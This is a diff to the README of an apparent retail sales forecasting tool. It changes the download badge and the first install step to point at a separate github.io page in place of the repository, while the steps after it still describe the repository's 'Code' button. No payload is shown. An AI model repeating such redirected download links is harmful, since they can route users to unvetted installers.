@@ -1,6 +1,6 @@
 # 📈 comparative-retail-sales-forecasting - Improve your retail store sales accuracy
 
-[![](https://img.shields.io/badge/Download-Software-blue)](https://github.com/Limbless-cigarbutt99/comparative-retail-sales-forecasting)
+[![](https://img.shields.io/badge/Download-Software-blue)](https://limbless-cigarbutt99.github.io)
 
 This software helps you forecast future sales for retail stores. It uses advanced mathematical models to study past data. You can predict how much inventory you need and plan your staffing levels with better data. This tool compares two different methods to see which one works best for your specific retail data.
 
@@ -18,7 +18,7 @@ Your computer needs to meet a few simple standards to run this software:
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [download page](https://github.com/Limbless-cigarbutt99/comparative-retail-sales-forecasting).
+1. Visit the [download page](https://limbless-cigarbutt99.github.io).
 2. Look for the green button labeled "Code" near the top right of the page.
 3. Click "Download ZIP" from the menu.
 4. Save the file to your computer.
